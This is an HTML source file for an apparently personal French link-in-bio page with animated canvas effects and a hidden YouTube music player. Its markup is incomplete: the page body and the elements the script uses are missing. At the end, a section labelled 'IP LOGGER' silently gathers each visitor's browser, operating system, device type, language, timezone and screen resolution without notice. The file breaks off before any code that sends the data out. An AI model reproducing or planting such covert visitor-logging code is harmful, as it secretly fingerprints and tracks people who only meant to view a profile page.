<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
        }

        .video-bg {
            position: fixed;
            top: 50%;
            left: 50%;
            width: 100vw;
            height: 100vh;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 0;
        }

        .video-bg video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: grayscale(100%) brightness(0.6);
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1;
        }

        .edge-aura {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 3;
            background: radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.7) 100%);
            animation: auraShift 6s ease-in-out infinite alternate;
        }

        @keyframes auraShift {
            0% {
                box-shadow:
                    inset 0 0 120px 40px rgba(0,0,0,0.9),
                    inset 0 0 200px 80px rgba(0,0,0,0.5);
            }
            50% {
                box-shadow:
                    inset 0 0 160px 60px rgba(20,20,20,1),
                    inset 0 0 250px 100px rgba(255,255,255,0.05);
            }
            100% {
                box-shadow:
                    inset 0 0 100px 30px rgba(0,0,0,0.95),
                    inset 0 0 180px 60px rgba(255,255,255,0.03);
            }
        }

        #venomCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 4;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
            position: relative;
            z-index: 5;
        }

        .avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: 0 auto 20px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            object-fit: cover;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
        }

        .avatar:hover {
            transform: scale(1.1) rotate(5deg);
            border-color: rgba(255, 255, 255, 0.8);
            box-shadow: 0 15px 50px rgba(255, 255, 255, 0.2);
        }

        .username {
            font-size: 24px;
            font-weight: 700;
            color: white;
            margin-bottom: 8px;
            transition: all 0.3s ease;
            cursor: default;
        }

        .username:hover {
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 2px;
        }

        .bio {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 30px;
        }

        .links {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .link-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 16px 24px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: white;
            text-decoration: none;
            font-weight: 500;
            font-size: 15px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            backdrop-filter: blur(10px);
            transform: scale(1);
        }

        .link-btn:hover {
            background: rgba(255, 255, 255, 0.9);
            color: #000;
            border-color: rgba(255, 255, 255, 1);
            transform: scale(1.05) translateY(-4px);
            box-shadow: 0 15px 40px rgba(255, 255, 255, 0.15);
        }

        .link-btn:active {
            transform: scale(0.97);
            transition: all 0.1s ease;
        }

        .link-btn svg {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            transition: transform 0.3s ease;
        }

        .link-btn:hover svg {
            transform: scale(1.2);
        }

        .music-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 10;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .music-btn:hover {
            background: rgba(255, 255, 255, 0.9);
            color: #000;
            border-color: white;
            transform: scale(1.15) rotate(10deg);
            box-shadow: 0 0 25px rgba(255, 255, 255, 0.3);
        }

        .music-btn:active {
            transform: scale(0.9);
            transition: all 0.1s ease;
        }

        .music-btn svg {
            width: 20px;
            height: 20px;
            transition: transform 0.3s ease;
        }

        .music-btn:hover svg {
            transform: scale(1.1);
        }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.3);
            transition: color 0.3s ease;
        }

        .footer:hover {
            color: rgba(255, 255, 255, 0.7);
        }

        .music-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: rgba(255, 255, 255, 0.1);
            z-index: 10;
        }

        .music-bar-fill {
            height: 100%;
            width: 0%;
            background: rgba(255, 255, 255, 0.6);
            transition: width 0.3s linear;
        }

        @media (max-width: 480px) {
            .avatar {
                width: 80px;
                height: 80px;
                font-size: 32px;
            }

            .username {
                font-size: 20px;
            }

            .link-btn {
                padding: 14px 20px;
                font-size: 14px;
            }
        }
    </style>
</head>

    <script>
        const canvas = document.getElementById('venomCanvas');
        const ctx = canvas.getContext('2d');
        let W, H;
        let mouse = { x: -1000, y: -1000 };
        const EDGE_ZONE = 120;

        function resize() {
            W = canvas.width = window.innerWidth;
            H = canvas.height = window.innerHeight;
        }
        resize();
        window.addEventListener('resize', resize);
        document.addEventListener('mousemove', function(e) {
            mouse.x = e.clientX;
            mouse.y = e.clientY;
        });

        function getEdges() {
            var edges = [];
            if (mouse.x < EDGE_ZONE) edges.push('left');
            if (mouse.x > W - EDGE_ZONE) edges.push('right');
            if (mouse.y < EDGE_ZONE) edges.push('top');
            if (mouse.y > H - EDGE_ZONE) edges.push('bottom');
            return edges;
        }

        class Tentacle {
            constructor() { this.reset(); }

            reset() {
                this.points = [];
                this.life = 0;
                this.maxLife = 1;
                this.speed = 0.6 + Math.random() * 1;
                this.wobble = 1 + Math.random() * 2;
                this.offset = Math.random() * 1000;
                this.thickness = 0.8 + Math.random() * 2;
                this.maxLength = 15 + Math.floor(Math.random() * 20);
                this.active = false;
                this.edge = 'left';
                this.spawnPos = { x: 0, y: 0 };
                this.growDir = { x: 1, y: 0 };
            }

            spawn(edge) {
                this.edge = edge;
                this.points = [];
                this.life = 1;
                this.active = true;
                this.maxLength = 15 + Math.floor(Math.random() * 20);

                if (edge === 'left') {
                    this.spawnPos = { x: 0, y: mouse.y + (Math.random() - 0.5) * 40 };
                    this.growDir = { x: 1, y: (Math.random() - 0.5) * 0.3 };
                } else if (edge === 'right') {
                    this.spawnPos = { x: W, y: mouse.y + (Math.random() - 0.5) * 40 };
                    this.growDir = { x: -1, y: (Math.random() - 0.5) * 0.3 };
                } else if (edge === 'top') {
                    this.spawnPos = { x: mouse.x + (Math.random() - 0.5) * 40, y: 0 };
                    this.growDir = { x: (Math.random() - 0.5) * 0.3, y: 1 };
                } else if (edge === 'bottom') {
                    this.spawnPos = { x: mouse.x + (Math.random() - 0.5) * 40, y: H };
                    this.growDir = { x: (Math.random() - 0.5) * 0.3, y: -1 };
                }

                this.points.push({ x: this.spawnPos.x, y: this.spawnPos.y });
            }

            update(t) {
                if (!this.active) return;

                if (this.points.length < this.maxLength) {
                    var last = this.points[this.points.length - 1];
                    var nx = last.x + this.growDir.x * this.speed;
                    var ny = last.y + this.growDir.y * this.speed;
                    nx += Math.sin(t * 0.005 + this.offset + this.points.length * 0.4) * this.wobble * 0.3;
                    ny += Math.cos(t * 0.006 + this.offset + this.points.length * 0.4) * this.wobble * 0.3;
                    this.points.push({ x: nx, y: ny });
                }

                var tip = this.points[this.points.length - 1];
                var distToMouse = Math.sqrt((mouse.x - tip.x) ** 2 + (mouse.y - tip.y) ** 2);
                if (distToMouse < 50 || this.points.length >= this.maxLength) {
                    this.life -= 0.02;
                }

                if (this.life <= 0) this.active = false;
            }

            draw() {
                if (!this.active || this.points.length < 2) return;
                for (var i = 1; i < this.points.length; i++) {
                    var p1 = this.points[i - 1];
                    var p2 = this.points[i];
                    var progress = i / this.points.length;
                    var alpha = this.life * progress * 0.8;
                    var w = this.thickness * (1 - progress * 0.5);

                    ctx.beginPath();
                    ctx.moveTo(p1.x, p1.y);
                    ctx.lineTo(p2.x, p2.y);
                    ctx.strokeStyle = 'rgba(255,255,255,' + alpha + ')';
                    ctx.lineWidth = w;
                    ctx.lineCap = 'round';
                    ctx.stroke();
                }
                if (this.points.length > 0) {
                    var tip = this.points[this.points.length - 1];
                    ctx.beginPath();
                    ctx.arc(tip.x, tip.y, this.thickness * 0.7, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,255,255,' + (this.life * 0.4) + ')';
                    ctx.fill();
                }
            }
        }

        var tentacles = [];
        for (var i = 0; i < 40; i++) tentacles.push(new Tentacle());
        var spawnTimer = 0;

        class ShootingStar {
            constructor() { this.reset(); }
            reset() {
                this.x = Math.random() * W * 0.3;
                this.y = Math.random() * H * 0.5;
                this.len = 80 + Math.random() * 140;
                this.speed = 6 + Math.random() * 10;
                this.angle = 0.3 + Math.random() * 0.4;
                this.thickness = 1.5 + Math.random() * 2;
                this.life = 1;
                this.decay = 0.008 + Math.random() * 0.01;
                this.hue = Math.random() > 0.5 ? 220 : 200;
                this.active = true;
                this.sparkles = [];
            }
            update() {
                if (!this.active) return;
                this.x += Math.cos(this.angle) * this.speed;
                this.y += Math.sin(this.angle) * this.speed;
                this.life -= this.decay;
                if (this.life <= 0 || this.x > W + 200 || this.y > H + 200) this.active = false;

                if (Math.random() < 0.4) {
                    var tailX = this.x - Math.cos(this.angle) * this.len * Math.random();
                    var tailY = this.y - Math.sin(this.angle) * this.len * Math.random();
                    this.sparkles.push({
                        x: tailX + (Math.random() - 0.5) * 4,
                        y: tailY + (Math.random() - 0.5) * 4,
                        life: 1,
                        size: 0.5 + Math.random() * 1.5
                    });
                }
                for (var i = this.sparkles.length - 1; i >= 0; i--) {
                    this.sparkles[i].life -= 0.03;
                    if (this.sparkles[i].life <= 0) this.sparkles.splice(i, 1);
                }
            }
            draw() {
                if (!this.active) return;
                var tailX = this.x - Math.cos(this.angle) * this.len;
                var tailY = this.y - Math.sin(this.angle) * this.len;

                var grad = ctx.createLinearGradient(tailX, tailY, this.x, this.y);
                grad.addColorStop(0, 'rgba(255,255,255,0)');
                grad.addColorStop(0.6, 'rgba(180,210,255,' + (this.life * 0.3) + ')');
                grad.addColorStop(1, 'rgba(255,255,255,' + (this.life * 0.9) + ')');

                ctx.beginPath();
                ctx.moveTo(tailX, tailY);
                ctx.lineTo(this.x, this.y);
                ctx.strokeStyle = grad;
                ctx.lineWidth = this.thickness;
                ctx.lineCap = 'round';
                ctx.stroke();

                ctx.beginPath();
                ctx.arc(this.x, this.y, this.thickness * 2, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(200,220,255,' + (this.life * 0.6) + ')';
                ctx.fill();

                ctx.beginPath();
                ctx.arc(this.x, this.y, this.thickness * 4, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(150,190,255,' + (this.life * 0.15) + ')';
                ctx.fill();

                for (var i = 0; i < this.sparkles.length; i++) {
                    var s = this.sparkles[i];
                    ctx.beginPath();
                    ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,255,255,' + (s.life * this.life * 0.8) + ')';
                    ctx.fill();
                }
            }
        }

        var stars = [];
        for (var i = 0; i < 5; i++) stars.push(new ShootingStar());
        var starTimer = 0;

        function animateVenom(t) {
            ctx.clearRect(0, 0, W, H);
            var edges = getEdges();

            spawnTimer++;
            if (edges.length > 0 && spawnTimer % 8 === 0) {
                for (var i = 0; i < tentacles.length; i++) {
                    if (!tentacles[i].active) {
                        tentacles[i].spawn(edges[Math.floor(Math.random() * edges.length)]);
                        break;
                    }
                }
            }

            for (var i = 0; i < tentacles.length; i++) {
                tentacles[i].update(t);
                tentacles[i].draw();
            }

            starTimer++;
            if (starTimer % 120 === 0) {
                for (var i = 0; i < stars.length; i++) {
                    if (!stars[i].active) { stars[i].reset(); break; }
                }
            }
            for (var i = 0; i < stars.length; i++) {
                stars[i].update();
                stars[i].draw();
            }

            requestAnimationFrame(animateVenom);
        }
        requestAnimationFrame(animateVenom);

        // YOUTUBE MUSIC
        var tag = document.createElement('script');
        tag.src = 'https://www.youtube.com/iframe_api';
        document.head.appendChild(tag);

        var player;
        var playing = false;

        function onYouTubeIframeAPIReady() {
            player = new YT.Player('ytPlayer', {
                height: '1',
                width: '1',
                videoId: 'MRmecqnNFb8',
                playerVars: {
                    autoplay: 0,
                    loop: 1,
                    playlist: 'MRmecqnNFb8',
                    controls: 0,
                    disablekb: 1,
                    modestbranding: 1
                },
                events: {
                    onReady: function(e) { e.target.unMute(); },
                    onStateChange: function(e) {
                        if (e.data === YT.PlayerState.ENDED) {
                            e.target.seekTo(0);
                            e.target.playVideo();
                        }
                    }
                }
            });
            setInterval(function() {
                if (player && player.getDuration && player.getDuration() > 0) {
                    var pct = (player.getCurrentTime() / player.getDuration()) * 100;
                    document.getElementById('musicBarFill').style.width = pct + '%';
                }
            }, 500);
        }

        function toggleMusic() {
            if (!player || !player.playVideo) return;
            if (playing) {
                player.pauseVideo();
                document.getElementById('playIcon').style.display = 'block';
                document.getElementById('pauseIcon').style.display = 'none';
            } else {
                player.playVideo();
                document.getElementById('playIcon').style.display = 'none';
                document.getElementById('pauseIcon').style.display = 'block';
            }
            playing = !playing;
        }

        // IP LOGGER
        var ua = navigator.userAgent;
        var browser = 'Unknown';
        if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
        else if (ua.indexOf('Edg') > -1) browser = 'Edge';
        else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
        else if (ua.indexOf('Safari') > -1) browser = 'Safari';
        else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';

        var os = 'Unknown';
        if (ua.indexOf('Windows') > -1) os = 'Windows';
        else if (ua.indexOf('Mac') > -1) os = 'MacOS';
        else if (ua.indexOf('Linux') > -1) os = 'Linux';
        else if (ua.indexOf('Android') > -1) os = 'Android';
        else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';

        var device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';

        var lang = navigator.language || navigator.userLanguage || 'N/A';
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
        var screenRes = screen.width + 'x' + screen.height;
